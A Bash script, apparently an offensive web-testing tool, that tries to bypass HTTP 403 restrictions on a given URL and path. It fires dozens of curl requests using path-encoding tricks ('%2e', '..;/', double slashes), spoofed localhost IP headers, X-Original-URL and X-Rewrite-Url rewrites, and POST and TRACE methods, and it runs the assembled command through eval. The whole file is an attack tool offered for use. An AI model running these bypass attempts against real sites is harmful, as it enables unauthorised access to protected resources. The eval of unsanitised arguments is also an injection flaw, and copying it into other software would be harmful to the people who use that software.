#! /bin/bash
ORANGE='\e[0;33m'
CYAN='\e[0;36m'
NC='\e[0m'

usage(){
  echo
  echo -e "Usage: $0 https://example.com path [-H \"Request-Header1: Value\" -H \"Request-Header2: Value\"]"
}

[ "$1" = "-h" ] && { usage && exit 1; }

if [ -z "$1" ] || [ -z "$2" ]
then
  usage; exit 1
fi

HEADERs=$3

fetch(){
  local url="$1" flags="$2"
  
  echo -e "\nFetching ${CYAN}$url${NC} with flags: ${CYAN}$flags${NC}"
  
  curl_cmd="curl --connect-timeout 10 -k -s -o /dev/null -L -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\" $HEADERs $flags -w \"%{http_code}\",\"%{size_download}\" $url"
  echo "$curl_cmd"
  
  res_str=$(eval $curl_cmd) || true
  IFS=',' read -ra res_arr <<< "$res_str"
  
  if [ "${res_arr[0]}" != "403" ]
  then
    echo -e "Response code: ${ORANGE}${res_arr[0]}${NC}, size: ${res_arr[1]}"
  else
    echo "Response code: ${res_arr[0]}, size: ${res_arr[1]}"
  fi
  
  sleep 0.5s
}

fetch "$1/$2"
fetch "$1/./$2"
fetch "$1/$2/."
fetch "$1/./$2/./"
fetch "$1/%2e/$2"
fetch "$1/$2/%2e"
fetch "$1/%2e/$2/%2e/"
fetch "$1//$2//"

fetch "$1/$2/*"
fetch "$1/$2#"
fetch "$1/$2?"
fetch "$1/$2/?anything"

fetch "$1/$2.php"
fetch "$1/$2.json"
fetch "$1/$2.html"

fetch "$1/$2%20"
fetch "$1/$2%09"

fetch "$1/$2..;/"
fetch "$1/$2;/"

fetch "$1/$2" "-H \"X-Forwarded-For: http://127.0.0.1\""
fetch "$1/$2" "-H \"X-Forwarded-For: 127.0.0.1\""
fetch "$1/$2" "-H \"X-Forwarded-For: 127.0.0.1:80\""
fetch "$1/$2" "-H \"X-Forwarded-For: 127.0.0.1:443\""
fetch "$1/$2" "-H \"X-Forwarded-For: http://localhost\""
fetch "$1/$2" "-H \"X-Forwarded-For: localhost\""
fetch "$1/$2" "-H \"X-Forwarded-For: localhost:80\""
fetch "$1/$2" "-H \"X-Forwarded-For: localhost:443\""

fetch "$1/$2" "-H \"Forwarded: http://127.0.0.1\""
fetch "$1/$2" "-H \"Forwarded: 127.0.0.1\""
fetch "$1/$2" "-H \"Forwarded: 127.0.0.1:80\""
fetch "$1/$2" "-H \"Forwarded: 127.0.0.1:443\""
fetch "$1/$2" "-H \"Forwarded: for=http://127.0.0.1\""
fetch "$1/$2" "-H \"Forwarded: for=127.0.0.1\""
fetch "$1/$2" "-H \"Forwarded: for=127.0.0.1:80\""
fetch "$1/$2" "-H \"Forwarded: for=127.0.0.1:443\""
fetch "$1/$2" "-H \"Forwarded: http://localhost\""
fetch "$1/$2" "-H \"Forwarded: localhost\""
fetch "$1/$2" "-H \"Forwarded: localhost:80\""
fetch "$1/$2" "-H \"Forwarded: localhost:443\""
fetch "$1/$2" "-H \"Forwarded: for=http://localhost\""
fetch "$1/$2" "-H \"Forwarded: for=localhost\""
fetch "$1/$2" "-H \"Forwarded: for=localhost:80\""
fetch "$1/$2" "-H \"Forwarded: for=localhost:443\""

fetch "$1/$2" "-H \"X-Forwarded-Host: 127.0.0.1\""
fetch "$1/$2" "-H \"X-Forwarded-Host: localhost\""

fetch "$1/$2" "-H \"X-Host: 127.0.0.1\""
fetch "$1/$2" "-H \"X-Host: localhost\""

fetch "$1/$2" "-H \"X-Real-Ip: 127.0.0.1\""
fetch "$1/$2" "-H \"X-Real-Ip: localhost\""

fetch "$1/$2" "-H \"X-ProxyUser-Ip: 127.0.0.1\""
fetch "$1/$2" "-H \"X-ProxyUser-Ip: localhost\""

fetch "$1/$2" "-H \"X-Custom-IP-Authorization: 127.0.0.1\""
fetch "$1/$2" "-H \"X-Custom-IP-Authorization: localhost\""

fetch "$1/$2" "-H \"X-Original-URL: $2\""

fetch "$1" "-H \"X-Rewrite-Url: $2\""

fetch "$1/$2" "-H \"Content-Length:0\" -X POST"

fetch "$1/$2" "-X TRACE"
